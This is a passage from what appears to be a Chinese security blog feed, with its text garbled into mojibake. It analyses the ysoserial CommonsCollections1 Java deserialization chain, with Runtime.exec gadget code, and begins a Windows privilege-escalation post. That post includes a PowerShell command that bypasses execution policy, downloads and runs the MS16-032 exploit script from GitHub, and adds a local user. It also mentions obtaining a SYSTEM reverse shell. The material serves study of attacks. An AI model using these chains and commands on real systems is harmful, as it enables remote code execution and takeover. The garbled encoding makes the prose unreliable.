ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°</p><p>æœ€åæˆ‘ä»¬å†å›æ¥çœ‹ysoserialä¸­å¯¹è¿™æ¡é“¾çš„åˆ©ç”¨ä»£ç </p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260214643.png"></p><p>è±ç„¶å¼€æœ—å–µå–µ</p><h2 id="ComminsCollections1ï¼ˆCC1ï¼‰"><a href="#ComminsCollections1ï¼ˆCC1ï¼‰" class="headerlink" title="ComminsCollections1ï¼ˆCC1ï¼‰"></a>ComminsCollections1ï¼ˆCC1ï¼‰</h2><p>å…ˆä¸Šé“¾å­</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*Gadget chain:    ObjectInputStream.readObject()        AnnotationInvocationHandler.readObject()            Map(Proxy).entrySet()                AnnotationInvocationHandler.invoke()                    LazyMap.get()                        ChainedTransformer.transform()                            ConstantTransformer.transform()                            InvokerTransformer.transform()                                Method.invoke()                                    Class.getMethod()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.getRuntime()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.exec()Requires:    commons-collections */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æ¥ä¸€å¥å¤§ä½¬çš„è¯</p><blockquote><p>CC1 é“¾çš„å…³é”®åœ¨ä¸‰ä¸ªå®ç°äº†Transformeræ¥â¼çš„ç±» ChainedTransformer ConstantTransformer InvokerTransformerï¼ŒTransformer é¡¾åæ€ä¹‰å°±æ˜¯ä¸€ä¸ªè½¬æ¢å™¨ç”¨æ¥å¤„ç†ä¼ å…¥çš„å¯¹è±¡ï¼Œç„¶åå°†å¤„ç†å®Œçš„å¯¹è±¡è¿”å›ã€‚</p></blockquote><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;Transformeræ¥å£package org.apache.commons.collections;public interface Transformer &#123;    Object transform(Object var1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£æˆ‘ä»¬å°±çœ‹çœ‹åœ¨commons.collectionéƒ½æœ‰å“ªäº›ç±»å®ç°äº†è¿™ä¸ªæ¥å£</p><ol><li><h3 id="InvokerTransformerï¼ˆè°ƒç”¨è€…è½¬æ¢å™¨ï¼‰"><a href="#InvokerTransformerï¼ˆè°ƒç”¨è€…è½¬æ¢å™¨ï¼‰" class="headerlink" title="InvokerTransformerï¼ˆè°ƒç”¨è€…è½¬æ¢å™¨ï¼‰"></a>InvokerTransformerï¼ˆè°ƒç”¨è€…è½¬æ¢å™¨ï¼‰</h3><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072202716.png"></p><p>å¯ä»¥çœ‹åˆ°é€šè¿‡è·å–<code>this.iMethodName, this.iParamTypes, this.iArgs</code>æ¥åå°„è°ƒç”¨ä¼ å…¥ç±»çš„æ–¹æ³•ï¼Œå…¶ä¸­å†…å®¹éƒ½å¯æ§ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯åªè¦ä¼ å…¥ä¸€ä¸ªRuntimeå¯¹è±¡ï¼Œè°ƒç”¨å…¶ä¸­çš„execæ–¹æ³•ï¼Œå°±èƒ½ä»»æ„å‘½ä»¤æ‰§è¡Œäº†å‘¢</p><p>ç›´æ¥è°ƒç”¨å¯è¡Œæ€§éªŒè¯</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072215402.png"></p><p>å‘ç°æˆåŠŸæ‰§è¡Œäº†ï¼Œä½†æ˜¯ç›´æ¥æ‰¾åˆ°â¼€ä¸ªç±»ï¼Œå®ƒåœ¨ååºåˆ—åŒ–çš„ <code>readObject</code> é‡Œç›´æ¥æˆ–é—´æ¥è°ƒç”¨äº† <code>InvokerTransformer</code> çš„ <code>transform</code> æ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°å¯æ§ï¼Œå°±èƒ½RCEï¼Œæ˜¯è¿™æ ·å—ï¼Ÿè‚¯å®šä¸æ˜¯ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å¾…åºåˆ—åŒ–çš„å¯¹è±¡å’Œæ‰€æœ‰å®ƒä½¿â½¤çš„å†…éƒ¨å±æ€§å¯¹è±¡ï¼Œå¿…é¡»éƒ½å®ç°äº† <code>java.io.Serializable</code> æ¥â¼ã€‚æˆ‘ä»¬éœ€è¦ä¼ ç»™ <code>transform</code> æ–¹æ³•çš„å‚æ•°æ˜¯ <code>Runtime</code> å¯¹è±¡ï¼Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™è‚¯å®šä¹Ÿå±äºå†…éƒ¨å±æ€§å¯¹è±¡ï¼Œè€Œå®ƒæ˜¯æ²¡æœ‰å®ç° <code>java.io.Serializable</code> æ¥â¼çš„ï¼Œæ‰€ä»¥å³ä½¿æ‰¾åˆ°äº†ç¬¦åˆæ¡ä»¶çš„ç±»ä¹Ÿæ²¡åŠæ³•æ„é€ æˆåºåˆ—åŒ–æ•°æ®ã€‚</p></li><li><h3 id="ChainedTransformerï¼ˆé“¾æ¡è½¬æ¢å™¨ï¼‰"><a href="#ChainedTransformerï¼ˆé“¾æ¡è½¬æ¢å™¨ï¼‰" class="headerlink" title="ChainedTransformerï¼ˆé“¾æ¡è½¬æ¢å™¨ï¼‰"></a>ChainedTransformerï¼ˆé“¾æ¡è½¬æ¢å™¨ï¼‰</h3><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211081031321.png"></p><p>æ­¤ç±»çš„transformé€šè¿‡æŒ‰é¡ºåºè°ƒç”¨ <code>Transformer</code> æ•°ç»„ <code>this.iTransformers</code> ä¸­æ‰€æœ‰ <code>Transformer</code> å¯¹è±¡çš„ <code>transform</code> æ–¹æ³•ï¼Œå¹¶ä¸”æ¯æ¬¡è°ƒç”¨çš„ç»“æœä¼ é€’ç»™ä¸‹ä¸€ä¸ªé¡¹ç›®çš„transformè¿›è¡Œè°ƒç”¨ï¼Œå°±åƒä¸€ä¸ªé“¾æ¡ä¸€æ ·é€å±‚ä¼ é€’æ‰§è¡Œï¼Œé‚£ä¹ˆäºŒè€…ç»“åˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>InvokerTransformer</code>é€šè¿‡åå°„æ¥é—´æ¥ç”Ÿæˆä¸€ä¸ª<code>Runtime</code>ç±»ï¼Œè¿›è€ŒRCE</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//åå°„è·å–Runtimeç±»</span><span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é“¾å¼è°ƒç”¨å†™æ³•</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//ç”ŸæˆRuntimeç±»å¯¹è±¡</span>                <span class="token string">"forName"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token comment">//è·å–invokeæ–¹æ³•æ‰§è¡Œ</span>                <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//RCE</span>                <span class="token string">"exec"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åè°ƒç”¨ <code>ChainedTransformer#transform()</code> å³å¯,å‚æ•°ä¸º <code>class</code>å¯¹è±¡<code>Class.class</code></p><p>æœ€åå°±æ˜¯æˆ‘ä»¬æ€ä¹ˆè·å–åˆ°ä¸€ä¸ªclasså¯¹è±¡ä½œä¸ºæˆ‘ä»¬é“¾å¼è°ƒç”¨çš„èµ·ç‚¹ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°</p></li><li><h3 id="ConstantTransformerï¼ˆå¸¸é‡è½¬æ¢å™¨ï¼‰"><a href="#ConstantTransformerï¼ˆå¸¸é‡è½¬æ¢å™¨ï¼‰" class="headerlink" title="ConstantTransformerï¼ˆå¸¸é‡è½¬æ¢å™¨ï¼‰"></a>ConstantTransformerï¼ˆå¸¸é‡è½¬æ¢å™¨ï¼‰</h3><p>æœ€åæˆ‘ä»¬å†æ¥çœ‹<code>ConstantTransformer</code>ï¼Œè¿™ä¸ªç±»å®ç°äº†åºåˆ—åŒ–æ¥å£æ‰€ä»¥ä¹Ÿå¯ä»¥è¿›è¡Œååºåˆ—åŒ–</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100043086.png"></p><p>å¯ä»¥çœ‹åˆ°<code>transform</code>å‡½æ•°å°±ç›´æ¥è¿”å›äº†<code>this.iConstant</code>ï¼Œè¿™é‡Œçš„<code>iConstant</code>æˆ‘ä»¬ç›´æ¥ä¼ å…¥å³å¯ï¼Œè¯´ç™½äº†å°±æ˜¯æ‹¿ä¸€ä¸ªå¯¹è±¡åŒ…è£¹ä¸€ä¸ªå¯¹è±¡ï¼ˆå¬èµ·æ¥å¤šå°‘æœ‰ç‚¹æ²¡ç”¨ï¼‰ï¼Œä¸è¿‡ï¼Œç”±äºå…¶<code>transform</code>æ–¹æ³•ä¼šå°†å…¶ä¸­çš„<code>iConstant</code>ç›´æ¥è¿”å›ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å…¶ä¸­åŒ…è£¹ä¸€ä¸ªclassç±»å¯¹è±¡æ¥ä½œä¸ºä¸Šé¢çš„é“¾å¼è°ƒç”¨çš„èµ·ç‚¹ï¼Œæœ€ç»ˆæ„é€ çš„é“¾å­å¦‚ä¸‹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100110622.png"></p><p>æœ€ç»ˆåªè¦è°ƒç”¨transforméšä¾¿æ‰”ç‚¹å•¥è¿›å»éƒ½èƒ½è°ƒç”¨æˆåŠŸ</p></li></ol><p><strong>LazyMap</strong></p><p>ä¸‹é¢æˆ‘ä»¬å°±è¦è¿›è¡Œå®Œæ•´çš„è°ƒç”¨é“¾æ„é€ äº†ï¼ŒRCEçš„éƒ¨åˆ†æˆ‘ä»¬å·²ç»å®Œæˆäº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åœ¨<code>readObject</code>æ–¹æ³•ä¸­è°ƒç”¨äº†å¯æ§å‚æ•°çš„<code>transform</code>æ–¹æ³•çš„ç±»äº†ï¼Œè¿™é‡Œysoserialé“¾å­ä½¿ç”¨çš„æ˜¯<code>AnnotationInvocationHandler</code>â€“&gt;<code>LazyMap#get()</code></p><p>å…ˆæ¥çœ‹çœ‹<code>AnnotationInvocationHandler</code><em><strong>#æ³¨é‡Šä¿¡æ¯å¤„ç†</strong></em>ï¼Œå…¶ä¸­çš„<code>readObject</code>æ–¹æ³•ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ°<code>Map</code> çš„<code>get</code>æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ <code>AnnotationInvocationHandler#invoke()</code> æ–¹æ³•è°ƒç”¨äº† <code>get</code> æ–¹æ³•ï¼Œ<code>this.memberValues</code>å¯æ§å¹¶ä¸”ä¸º<code>Map</code>ç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰¾ä¸ªå®ç°äº†Mapæ¥å£çš„ç±»å³å¯ï¼Œæ­¤å¤„åˆ©ç”¨çš„æ˜¯<code>LazyMap</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211110059774.png"></p><p>æˆ‘ä»¬ç»§ç»­è·Ÿå…¥ï¼Œå‘ç°<code>LazyMap</code>é‡å†™äº†<code>get</code>æ–¹æ³•å¦‚ä¸‹ï¼Œå¯¹<code>factory</code>å±æ€§çš„<code>transform</code>æ–¹æ³•è¿›è¡Œäº†è°ƒç”¨ï¼Œæ­¤å¤„çš„factoryä¸ºTransformerç±»ï¼Œä½¿ç”¨å…¶çš„å®ç°ç±»å³å¯ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬ç”¨æ¥RCEçš„ChainedTransformerï¼‰</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211110105849.png"></p><p>ç°åœ¨çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬å¦‚ä½•è°ƒç”¨<code>AnnotationInvocationHandler#invoke()</code>æ–¹æ³•äº†ï¼Œè¿™é‡Œæ¶‰åŠåˆ°çš„çŸ¥è¯†å°±æ˜¯Javaçš„åŠ¨æ€ä»£ç†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª<code>AnnotationInvocationHandler</code>ä»£ç†ç±»ï¼Œç„¶ååœ¨è°ƒç”¨<code>AnnotationInvocationHandler</code>ä»£ç†ç±»ä¸­çš„ä»»æ„æ–¹æ³•éƒ½ä¼šå…ˆè°ƒç”¨<code>AnnotationInvocationHandler#invoke()</code>æ–¹æ³•ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬åœ¨è°ƒç”¨ç±»å†…éæ™¶æ€</p><p>æ€»ç»“ä¸€ä¸‹ç°æœ‰çš„é“¾å­ï¼Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ª<code>LazyMap</code>å¯¹è±¡ï¼Œå°†å…¶ä¸­çš„<code>factory</code>è®¾ç½®ä¸ºæ„é€ å¥½çš„<code>ChainedTransformer</code>ï¼Œè¿™æ ·åœ¨è°ƒç”¨<code>LazyMap</code>çš„<code>get</code>æ–¹æ³•æ—¶å°±èƒ½é“¾å¼è°ƒç”¨å¯¼è‡´RCEäº†ï¼Œé‚£æˆ‘ä»¬ç°åœ¨å†åˆ†æä¸€ä¸‹Poc</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class CommonsCollections1 extends PayloadRunner implements ObjectPayload&lt;InvocationHandler&gt; &#123;public InvocationHandler getObject(final String command) throws Exception &#123;final String[] execArgs &#x3D; new String[] &#123; command &#125;;&#x2F;&#x2F;å¼€ä¸€ä¸ªchainedTransformerfinal Transformer transformerChain &#x3D; new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(1) &#125;);&#x2F;&#x2F;çœŸæ­£çš„é“¾å­final Transformer[] transformers &#x3D; new Transformer[] &#123;new ConstantTransformer(Runtime.class),new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),new InvokerTransformer(&quot;exec&quot;,new Class[] &#123; String.class &#125;, execArgs),new ConstantTransformer(1) &#125;;final Map innerMap &#x3D; new HashMap();final Map lazyMap &#x3D; LazyMap.decorate(innerMap, transformerChain);final Map mapProxy &#x3D; Gadgets.createMemoitizedProxy(lazyMap, Map.class);final InvocationHandler handler &#x3D; Gadgets.createMemoizedInvocationHandler(mapProxy);Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); &#x2F;&#x2F; arm with actual transformer chainreturn handler;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ComminsCollections3ï¼ˆCC3ï¼‰"><a href="#ComminsCollections3ï¼ˆCC3ï¼‰" class="headerlink" title="ComminsCollections3ï¼ˆCC3ï¼‰"></a>ComminsCollections3ï¼ˆCC3ï¼‰</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;* * Variation on CommonsCollections1 that uses InstantiateTransformer instead of * InvokerTransformer. *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ–‡ç« å¼•ç”¨ï¼š</p><p><a href="https://blog.csdn.net/solitudi/article/details/119082164">https://blog.csdn.net/solitudi/article/details/119082164</a></p><p><a href="https://www.anquanke.com/post/id/247434">https://www.anquanke.com/post/id/247434</a></p><p><a href="https://blog.weik1.top/">https://blog.weik1.top/</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…ç½‘åŸŸæ¸—é€ ææƒ</title>
      <link href="/posts/e80ed6fe.html"/>
      <url>/posts/e80ed6fe.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä½æƒé™å¯»æ‰¾ææƒæ‰‹æ®µ"><a href="#ä½æƒé™å¯»æ‰¾ææƒæ‰‹æ®µ" class="headerlink" title="ä½æƒé™å¯»æ‰¾ææƒæ‰‹æ®µ"></a>ä½æƒé™å¯»æ‰¾ææƒæ‰‹æ®µ</h1><p>å¸¸è§çš„ææƒæ‰‹æ®µï¼š</p><p>1ã€æœ¬åœ°æº¢å‡ºæ¼æ´</p><p>2ã€æ•°æ®åº“ææƒ</p><p>3ã€ç¬¬ä¸‰æ–¹è½¯ä»¶ææƒ</p><p>æƒ³è¦ææƒæˆ‘ä»¬å°±éœ€è¦å…ˆäº†è§£è¿™å°ç”µè„‘ä¸Šé¢ç©¶ç«Ÿæœ‰ä»€ä¹ˆæ¼æ´å¯ä¾›æˆ‘ä»¬åˆ©ç”¨ï¼Œæ‰€ä»¥ç¬¬ä¸€ä»¶äº‹è¿˜æ˜¯é€šè¿‡ä¿¡æ¯æ”¶é›†æ¥æ‰¾åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œè¿™é‡Œæœ‰ä¸€äº›å¯ä»¥å¸®åŠ©æˆ‘ä»¬çš„è„šæœ¬</p><h2 id="å¯»æ‰¾ææƒæ¼æ´"><a href="#å¯»æ‰¾ææƒæ¼æ´" class="headerlink" title="å¯»æ‰¾ææƒæ¼æ´"></a>å¯»æ‰¾ææƒæ¼æ´</h2><h3 id="Windows-Exploit-Suggester-Next-Generation-WES-NG"><a href="#Windows-Exploit-Suggester-Next-Generation-WES-NG" class="headerlink" title="Windows Exploit Suggester - Next Generation (WES-NG)"></a>Windows Exploit Suggester - Next Generation (WES-NG)</h3><p><a href="https://github.com/bitsadmin/wesng">è„šæœ¬é“¾æ¥</a></p><p>è¿™ä¸ªè„šæœ¬å¯ä»¥é€šè¿‡è®¡ç®—æœºçš„ç³»ç»Ÿä¿¡æ¯æ¥çœ‹åˆ°ç”µè„‘çš„è¡¥ä¸ä¿¡æ¯ï¼Œè¿›è€Œæ¨æ–­å‡ºå½“å‰æœºå™¨å¯è¢«åˆ©ç”¨çš„æ¼æ´</p><p>è·å–ä¿¡æ¯çš„æ–¹å¼æœ‰ä¸‰ç§</p><blockquote><p>There are two options to check for missing patches: a. Launch <code>missingkbs.vbs</code> on the host to have Windows determine which patches are missing b. Use Windowsâ€™ built-in <code>systeminfo.exe</code> tool to obtain the system information of the local system, or from a remote system using <code>systeminfo /S MyRemoteHost</code>, and redirect this to a file: <code>systeminfo &gt; systeminfo.txt</code></p><p>æœ‰ä¸¤ä¸ªé€‰é¡¹å¯ä»¥æ£€æŸ¥ç¼ºå¤±çš„è¡¥ä¸ï¼šåœ¨ä¸»æœºä¸Šå¯åŠ¨<code>missingkbs.vbs</code>ï¼Œè®© Windows ç¡®å®šç¼ºå°‘å“ªäº›è¡¥ä¸ b.ä½¿ç”¨Windowså†…ç½®çš„<code>systeminfo.exe</code>å·¥å…·è·å–æœ¬åœ°ç³»ç»Ÿçš„ç³»ç»Ÿä¿¡æ¯ï¼Œæˆ–è€…ä½¿ç”¨<code>systeminfo /S MyRemoteHost</code>ä»è¿œç¨‹ç³»ç»Ÿè·å–ç³»ç»Ÿä¿¡æ¯ï¼Œå¹¶å°†å…¶é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼š<code>systeminfo &gt; systeminfo.txt</code></p></blockquote><p>è·å–åˆ°çš„ä¿¡æ¯æ”¾åˆ°æ–‡ä»¶ä¸­ä¼ å…¥è„šæœ¬æ‰§è¡Œå³å¯çœ‹åˆ°ç»“æœ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202009074.png"></p><h2 id="ææƒè„šæœ¬å¤§å…¨"><a href="#ææƒè„šæœ¬å¤§å…¨" class="headerlink" title="ææƒè„šæœ¬å¤§å…¨"></a>ææƒè„šæœ¬å¤§å…¨</h2><h3 id="æº¢å‡ºæ¼æ´ææƒ"><a href="#æº¢å‡ºæ¼æ´ææƒ" class="headerlink" title="æº¢å‡ºæ¼æ´ææƒ"></a>æº¢å‡ºæ¼æ´ææƒ</h3><h4 id="MS16-032ææƒ"><a href="#MS16-032ææƒ" class="headerlink" title="MS16-032ææƒ"></a>MS16-032ææƒ</h4><p>é€šè¿‡è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥ä»¥ä¸€ä¸ªæ™®é€šç”¨æˆ·èº«ä»½ï¼Œæ¥æ·»åŠ ä¸€ä¸ªadministratorç®¡ç†å‘˜ç»„çš„ç”¨æˆ·ï¼Œè¿˜èƒ½ä»¥SYSTEMæƒé™æ¥è¿è¡Œç¨‹åº</p><p>æ¼æ´å‰æï¼šç›®æ ‡ç³»ç»Ÿéœ€è¦æœ‰2ä¸ªä»¥ä¸Šçš„CPUæ ¸å¿ƒï¼Œå¹¶ä¸”PowerShellæ˜¯2.0ä»¥ä¸Šçš„ç‰ˆæœ¬</p><p>æ­¤æ¼æ´å½±å“Windows Vistaåˆ°Windows10ä¹‹é—´çš„æ‰€æœ‰æœªä¿®å¤è®¾å¤‡</p><p>é¦–å…ˆæ‰¾åˆ°å¯¹åº”çš„<a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1">ææƒè„šæœ¬</a>ï¼ŒæŒ‰æ•™ç¨‹æ¥è¯´ç›´æ¥è¿è¡Œå°±å¥½ï¼Œä½†æ˜¯æˆ‘æœ¬æœºç¯å¢ƒå°è¯•äº†å¥½å¤šééƒ½æ²¡æœ‰ååº”ï¼Œæ‰“å¼€æŠ¥é”™åå‘ç°æ˜¯å› ä¸ºåŸå§‹çŠ¶æ€ä¸‹é™åˆ¶äº†powershellæ‰§è¡Œè„šæœ¬ï¼Œåœ¨æˆ‘æƒ³å¦‚ä½•ä¸ä½¿ç”¨ç®¡ç†å‘˜æƒé™ä¿®æ”¹powershellæ§åˆ¶æ—¶ï¼Œå‘ç°äº†å¦ä¸€ç§æ‰§è¡Œè„šæœ¬çš„æ–¹æ³•</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Ridter&#x2F;Pentest&#x2F;master&#x2F;powershell&#x2F;MyShell&#x2F;Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;&#x2F;c net user evi1cg test123 &#x2F;add&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·æ‰§è¡Œçš„è¯å°±ä¸ä¼šæç¤ºéœ€è¦æƒé™å¹¶ä¸”å‘½ä»¤ä¹Ÿèƒ½æ­£å¸¸æ‰§è¡Œï¼Œè¿™è¿˜æœ‰ä¸ªå°å‘ï¼Œå°±æ˜¯åœ¨adduserçš„æ—¶å€™ä¸€å®šè¦ä¿è¯å¯†ç æ˜¯èƒ½é€šè¿‡å®‰å…¨æ€§éªŒè¯çš„ï¼Œä¸ç„¶æ²¡æœ‰æ–°ç”¨æˆ·ç”Ÿæˆå¾ˆå®¹æ˜“è¯¯è®¤ä¸ºææƒå¤±è´¥</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œæœ¨é©¬æ–‡ä»¶ï¼Œè¿™æ ·åå¼¹çš„shellå°±æ˜¯SYSTEMç”¨æˆ·æƒé™äº†</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202320685.png"></p><h3 id="æœ¬åœ°ææƒæ¼æ´"><a href="#æœ¬åœ°ææƒæ¼æ´" class="headerlink" title="æœ¬åœ°ææƒæ¼æ´"></a>æœ¬åœ°ææƒæ¼æ´</h3><h4 id="CVE-2020-0787"><a href="#CVE-2020-0787" class="headerlink" title="CVE-2020-0787"></a>CVE-2020-0787</h4><p>å½“WindowsèƒŒæ™¯æ™ºèƒ½ä¼ 